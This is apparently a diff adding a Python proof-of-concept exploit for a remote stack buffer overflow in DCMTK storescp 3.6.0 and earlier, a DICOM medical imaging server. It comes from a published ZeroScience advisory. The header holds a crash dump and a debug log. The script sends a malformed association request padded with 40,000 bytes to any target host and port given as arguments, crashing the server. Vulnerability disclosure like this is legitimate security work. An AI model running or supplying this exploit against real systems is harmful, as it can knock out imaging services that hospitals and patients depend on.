@@ -1,0 +1,162 @@
+#!/usr/bin/env python
+# -*- coding: utf8 -*-
+#
+#
+# DCMTK storescp DICOM storage (C-STORE) SCP Remote Stack Buffer Overflow
+#
+#
+# Vendor: OFFIS e. V.
+# Product web page: http://www.dcmtk.org
+# Affected version: <= 3.6.0
+# Not affected: DCMTK-3.6.1_20160216 - https://github.com/commontk/DCMTK/commit/1b6bb76
+#
+# http://www.idoimaging.com/programs?order=program.rdate&
+#
+# Summary: DCMTK is a collection of libraries and applications implementing large
+# parts the DICOM standard. It includes software for examining, constructing and
+# converting DICOM image files, handling offline media, sending and receiving images
+# over a network connection, as well as demonstrative image storage and worklist
+# servers. DCMTK is is written in a mixture of ANSI C and C++. It comes in complete
+# source code and is made available as "open source" software.
+#
+# Desc: "At several places in the code a wrong length of ACSE data structures received
+# over the network can cause overflows or underflows when processing those
+# data structures. Related checks have been added at various places in order
+# to prevent such (possible) attacks. Thanks to Kevin Basista for the report."
+#
+# The bug will indeed affect all DCMTK-based server applications that accept incoming
+# DICOM network connections that are using the dcmtk-3.6.0 and earlier versions.
+# Developers are advised to apply the patched-DCMTK-3.6.1_20160216 fix commit from
+# Dec 14, 2015.
+#
+# ---------------------------------------------------------------------------------
+#
+# Process 27765 stopped
+# * thread #1: tid = 0x3e4b46, 0x00000001000a6f1d storescp`parsePresentationContext(unsigned char, dul_presentationcontext*, unsigned char*, unsigned long*, unsigned long) + 3325, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x10380001b)
+#     frame #0: 0x00000001000a6f1d storescp`parsePresentationContext(unsigned char, dul_presentationcontext*, unsigned char*, unsigned long*, unsigned long) + 3325
+# storescp`parsePresentationContext:
+# ->  0x1000a6f1d <+3325>: movb   (%rax), %al
+#     0x1000a6f1f <+3327>: movzbl %al, %eax
+#     0x1000a6f22 <+3330>: cmpl   $0x40, %eax
+#     0x1000a6f25 <+3333>: movl   %eax, -0xa74(%rbp)
+# (lldb) re r
+# General Purpose Registers:
+#        rax = 0x000000010380001b
+#        rbx = 0x0000000000000000
+#        rcx = 0x00000001002d40f0  vtable for log4cplus::spi::AppenderAttachable + 16
+#        rdx = 0x0000000000000010
+#        rdi = 0x00007fff5fbf78a0
+#        rsi = 0x3f7bc30000000000
+#        rbp = 0x00007fff5fbf7b30
+#        rsp = 0x00007fff5fbf7030
+#         r8 = 0x0000000100733918
+#         r9 = 0x00000000003e4b46
+#        r10 = 0x0000000100733920
+#        r11 = 0xffffffff00000000
+#        r12 = 0x0000000000000000
+#        r13 = 0x0000000000000000
+#        r14 = 0x0000000000000000
+#        r15 = 0x0000000000000000
+#        rip = 0x00000001000a6f1d  storescp`parsePresentationContext(unsigned char, dul_presentationcontext*, unsigned char*, unsigned long*, unsigned long) + 3325
+#     rflags = 0x0000000000010246
+#         cs = 0x000000000000002b
+#         fs = 0x0000000000000000
+#         gs = 0x0000000000000000
+#
+# (lldb)
+#
+# =====
+#
+# ➜  bin ./storescp -d 4242
+# D: $dcmtk: storescp v3.6.0 2011-01-06 $
+# D: 
+# D: setting network receive timeout to 60 seconds
+# D: PDU Type: Associate Request, PDU Length: 32881 + 6 bytes PDU header
+# D: Only dumping 512 bytes.
+# D:   01  00  00  00  80  71  00  01  00  00  4f  52  54  48  41  4e
+# D:   43  20  20  20  20  20  20  20  20  20  54  45  53  54  53  55
+# D:   49  54  45  00  00  00  00  00  00  00  00  00  00  00  00  00
+# D:   00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
+# D:   00  00  00  00  00  00  00  00  00  00  10  00  00  15  31  2e
+# D:   32  2e  38  34  30  2e  31  30  30  30  38  2e  33  2e  31  2e
+# D:   31  2e  31  20  00  80  00  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D:   42  43  44  41  42  43  44  41  42  43  44  41  42  43  44  41
+# D: 
+# D: Parsing an A-ASSOCIATE PDU
+# [1]    25553 segmentation fault  ./storescp -d 4242
+# ➜  bin  
+#
+# ---------------------------------------------------------------------------------
+#
+# Tested on: Microsoft Windows 7 Professional SP1 (EN)
+#            Microsoft Windows 7 Ultimate SP1 (EN)
+#            MacOS X 10.12.2 Sierra
+#            Linux Ubuntu 14.04.5
+#            FreeBSD 10.3
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2016-5384
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5384.php
+#
+#
+# 22.11.2016
+#
+
+
+import socket, sys
+
+hello = ('\x01\x00\x00\x00\x80\x71\x00\x01\x00\x00\x4f\x52\x54\x48'
+         '\x41\x4e\x43\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4a\x4f'
+         '\x58\x59\x50\x4f\x58\x59\x21\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x10\x00\x00\x15\x31\x2e\x32\x2e\x38\x34'
+         '\x30\x2e\x31\x30\x30\x30\x38\x2e\x33\x2e\x31\x2e\x31\x2e'
+         '\x31\x20\x00\x80\x00')
+
+bye = ('\x50\x00\x00\x0c\x51\x00\x00\x04\x00\x00\x07\xde'
+       '\x52\x00\x00\x00')
+
+buffer = '\x41\x42\x43\x44' * 10000
+
+if len(sys.argv) < 3:
+	print '\nUsage: ' +sys.argv[0]+ ' <target> <port>'
+	print 'Example: ' +sys.argv[0]+ ' 172.19.0.214 4242\n'
+	sys.exit(0)
+ 
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((host, port))
+s.settimeout(251)
+s.send(hello+buffer+bye)
+s.close
